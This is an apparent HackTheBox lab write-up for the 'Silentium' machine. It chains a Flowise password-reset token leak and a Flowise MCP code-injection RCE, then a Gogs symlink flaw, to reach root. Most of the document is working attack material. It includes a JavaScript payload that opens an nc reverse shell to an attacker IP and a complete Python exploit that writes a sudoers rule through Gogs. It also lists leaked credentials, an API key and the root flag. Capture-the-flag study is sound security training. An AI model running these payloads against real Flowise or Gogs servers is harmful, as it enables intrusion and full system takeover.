---
layout: page
title: "Silentium"
major_type: Platform
parent_group: htb
summary: "HTB Easy Linux Machine: Exploiting Flowise CVEs and Gogs symlink bypass for root."
published: false
---

## Overview
- **Machine Name:** Silentium
- **OS:** Linux (Ubuntu 24.04)
- **Difficulty:** Easy
- **Release Date:** 2026
- **IP:** 10.129.34.215

## Attack Chain Summary
```mermaid
graph TD
  A["1. Enumeration<br>Nginx + VHost staging.silentium.htb"] --> B["2. CVE-2025-58434<br>Flowise password reset token leak"]
  B --> C["3. CVE-2025-59528<br>Flowise MCP RCE - Shell in Docker"]
  C --> D["4. Pivoting<br>Found ben:r04D!!_R4ge - SSH to host"]
  D --> E["5. CVE-2025-8110<br>Gogs symlink bypass - Write sudoers"]
  E --> F(("6. Escalation<br>sudo su - ROOT"))
  
  classDef default fill:#1e1e1e,stroke:#3e3e42,stroke-width:2px,color:#cccccc;
  classDef success fill:#2e3e2e,stroke:#4ec9b0,stroke-width:2px,color:#ffffff;
  class F success;
```

---

## 1. Initial Enumeration

### Nmap Scan
```bash
nmap -sV -sC 10.129.34.215
```

**Results:**
```text
Port
22
80
```

### VHost Discovery
Added to `/etc/hosts`:
```bash
echo "10.129.34.215 silentium.htb" >> /etc/hosts
```

VHost fuzzing:
```bash
gobuster vhost -u http://silentium.htb -w /usr/share/wordlists/dirb/common.txt --append-domain
```
**Result:** Discovered `staging.silentium.htb` → Running Flowise AI v3.0.5

---

## 2. Initial Access - CVE-2025-58434 (Flowise Password Reset)
The Flowise instance was vulnerable to an unauthenticated password reset token leak.

**Step 1: Leak the Reset Token**
```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
```

**Response:**
```json
{
  "success": true,
  "user": {
    "email": "ben@silentium.htb",
    "tempToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "tokenExpiry": "2025-05-19T02:50:00.000Z"
  }
}
```

**Step 2: Reset Password**
```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "tempToken": "FRESH_LEAKED_TOKEN",
    "password": "Password123!",
    "confirmPassword": "Password123!"
  }'
```
> [!WARNING]
> Token expires quickly - generate fresh one immediately.

**Step 3: Login to Flowise**
- **URL:** `http://staging.silentium.htb`
- **Credentials:** `ben@silentium.htb / Password123!`
- Navigate to `Settings` → `API Keys` → **Get API Key:** `hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc`

---

## 3. Remote Code Execution - CVE-2025-59528 (Flowise MCP)
Vulnerability in Flowise's Custom MCP node allows arbitrary code execution via insecure evaluation of `mcpServerConfig`.

**Exploit Payload (`payload.json`):**
```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.82 4444 >/tmp/f');return 1;})()} )"
  }
}
```

**Execute RCE:**

Start listener on attacker machine:
```bash
nc -lvnp 4444
```

Send payload:
```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -H "Content-Type: application/json" \
  -d @payload.json
```
**Result:** Shell lands inside Docker container as `node` user.

**Enumerate Environment:**
Inside docker container:
```bash
env
```
Found credentials:
- `FLOWISE_PASSWORD`
- `SMTP_PASSWORD`

---

## 4. Pivoting to Host
Using found credentials to SSH into the host:
```bash
ssh ben@silentium.htb
# Password: r04D!!_R4ge
```

**User Flag:**
```bash
find /home -name "user.txt"
cat /home/ben/user.txt
```

---

## 5. Privilege Escalation - CVE-2025-8110 (Gogs)

**Enumeration:**
```bash
ps aux | grep gogs
```
**Output:**
```text
root  1532  0.0  1.6 1664680 67352 ?  Ssl  02:38  /opt/gogs/gogs/gogs web
```
Gogs running as root on port 3000.

**Setup SSH Tunnel:**
```bash
ssh -L 3001:127.0.0.1:3000 ben@silentium.htb
```
Access Gogs at: `http://127.0.0.1:3001`

**Vulnerability Explanation:**
CVE-2025-8110 is a bypass of CVE-2024-55947. The vulnerability allows authenticated users to:
1. Create a repository with a symbolic link pointing outside the repo
2. Use PutContents API to write to the symlink
3. Overwrite arbitrary files on the system (as root)

### Manual Exploitation

**Step 1:** Create account at `http://127.0.0.1:3001/user/sign_up`
**Step 2:** Generate API token - Settings → Applications → Generate New Token
**Step 3:** Create repository via API
```bash
curl -X POST "http://127.0.0.1:3001/api/v1/user/repos" \
  -H "Authorization: token <TOKEN>" \
  -d '{"name": "exploit", "auto_init": true}'
```

**Step 4:** Clone and create symlink
```bash
git clone http://attacker:Password123@127.0.0.1:3001/attacker/exploit.git
cd exploit
ln -s /etc/sudoers.d/ben malicious_link
git add malicious_link && git commit -m "symlink" && git push
```

**Step 5:** Write payload to symlink
```bash
echo -n "ben ALL=(ALL) NOPASSWD: ALL" | base64
# Output: YmVuIEFMTC09KEFOTCkgTk9QQVNTS0Q6IEFMTAo=

curl -X PUT "http://127.0.0.1:3001/api/v1/repos/attacker/exploit/contents/malicious_link" \
  -H "Authorization: token <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"message": "exploit", "content": "YmVuIEFMTC09KEFOTCkgTk9QQVNTS0Q6IEFMTAo="}'
```

**Step 6:** Escalate to root
```bash
sudo su
cat /root/root.txt
```

---

## 6. Automated Exploit Script

`exploit_gogs.py`
```python
#!/usr/bin/env python3
import argparse
import requests
import os
import subprocess
import base64
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def login(session, base_url, username, password):
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one("input[name=_csrf]").get("value")
    login_data = {"_csrf": csrf, "user_name": username, "password": password}
    resp = session.post(login_url, data=login_data, allow_redirects=True)
    if "Logout" in resp.text or "Sign Out" in resp.text:
        print(f"[+] Logged in as {username}")
        return True
    print(f"[-] Login failed - need to register first")
    return False

def register(session, base_url, username, password, email):
    register_url = f"{base_url}/user/sign_up"
    resp = session.get(register_url)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one("input[name=_csrf]").get("value")
    register_data = {"_csrf": csrf, "user_name": username, "email": email, "password": password, "retype": password}
    resp = session.post(register_url, data=register_data, allow_redirects=True)
    if "Logout" in resp.text or "Sign Out" in resp.text:
        print(f"[+] Registered as {username}")
        return True
    return False

def get_application_token(session, base_url):
    settings_url = f"{base_url}/user/settings/applications"
    get_resp = session.get(settings_url)
    soup = BeautifulSoup(get_resp.text, "html.parser")
    csrf = soup.select_one("input[name=_csrf]").get("value")
    token_name = f"exploit_{os.urandom(4).hex()}"
    data = {"_csrf": csrf, "name": token_name}
    resp = session.post(settings_url, data=data)
    soup = BeautifulSoup(resp.text, "html.parser")
    try:
        token = soup.find("div", class_="ui info message").find("p").text.strip()
        print(f"[+] Got API token")
        return token
    except:
        return None

def create_repo(session, base_url, token, repo_name):
    api = f"{base_url}/api/v1/user/repos"
    session.headers.update({"Authorization": f"token {token}"})
    data = {"name": repo_name, "auto_init": True, "private": False}
    resp = session.post(api, json=data)
    if resp.status_code in [200, 201, 204]:
        print(f"[+] Created repo: {repo_name}")
        return True
    return False

def clone_and_push_symlink(base_url, username, password, repo_name):
    repo_dir = f"/tmp/{repo_name}"
    if os.path.exists(repo_dir):
        subprocess.run(["rm", "-rf", repo_dir], check=True)
    parsed = urlparse(base_url)
    safe_password = quote(password, safe='')
    clone_url = f"{parsed.scheme}://{username}:{safe_password}@{parsed.netloc}/{username}/{repo_name}.git"
    result = subprocess.run(["git", "clone", clone_url, repo_dir], capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Git clone failed: {result.stderr}")
        return None
    symlink_path = os.path.join(repo_dir, "malicious_link")
    if os.path.exists(symlink_path):
        os.remove(symlink_path)
    os.symlink("/etc/sudoers.d/ben", symlink_path)
    print(f"[+] Created symlink -> /etc/sudoers.d/ben")
    subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
    subprocess.run(["git", "commit", "-m", "exploit"], cwd=repo_dir, check=True)
    subprocess.run(["git", "push", "origin", "master"], cwd=repo_dir, check=True)
    print(f"[+] Pushed symlink")
    return repo_dir

def exploit_via_api(session, base_url, token, username, repo_name, payload):
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    data = {"message": "Exploit", "content": base64.b64encode(payload.encode()).decode()}
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.put(api, json=data)
    if resp.status_code in [200, 201]:
        print(f"[+] Payload written to /etc/sudoers.d/ben")
        return True
    return False

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-8110 Gogs Exploit")
    parser.add_argument("-u", "--url", default="http://127.0.0.1:3001")
    parser.add_argument("-un", "--username", required=True)
    parser.add_argument("-pw", "--password", required=True)
    parser.add_argument("-e", "--email", help="Email for registration")
    parser.add_argument("-r", "--repo", default=None, help="Repo name")
    args = parser.parse_args()
    base_url = args.url.rstrip("/")
    session = requests.Session()
    if not login(session, base_url, args.username, args.password):
        email = args.email or f"{args.username}@silentium.htb"
        if not register(session, base_url, args.username, args.password, email):
            print("[-] Cannot login or register")
            return
    token = get_application_token(session, base_url)
    if not token:
        print("[-] No API token")
        return
    repo_name = args.repo or f"exploit_{os.urandom(6).hex()}"
    create_repo(session, base_url, token, repo_name)
    repo_dir = clone_and_push_symlink(base_url, args.username, args.password, repo_name)
    if not repo_dir:
        print("[-] Git clone failed")
        return
    payload = "ben ALL=(ALL) NOPASSWD: ALL\n"
    exploit_via_api(session, base_url, token, args.username, repo_name, payload)
    print("\n[+] Done! Run: sudo su")
    print("[+] Then: cat /root/root.txt")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
pip install requests beautifulsoup4
python3 exploit_gogs.py -un attacker -pw Password123
```

---

## 7. Final Escalation

**Root Shell Output:**
```bash
ben@silentium:~$ sudo su
root@silentium:/tmp# cat /root/root.txt
44d3d6d86f9a94d1e97b6e3b90946be1
```

### Summary

| Stage | Details |
|---|---|
| Initial | `staging.silentium.htb` (Flowise v3.0.5) |
| RCE | Flowise Password Reset -> Custom MCP node evaluation |
| Pivoting | Cleartext credentials inside container -> SSH |
| Privesc | Gogs CVE-2025-8110 symlink bypass via API |

**Flags:**
- **User:** FOUND EARLIER
- **Root:** `44d3d6d86f9a94d1e97b6e3b90946be1`

**Machine Owned! 🏴‍☠️**
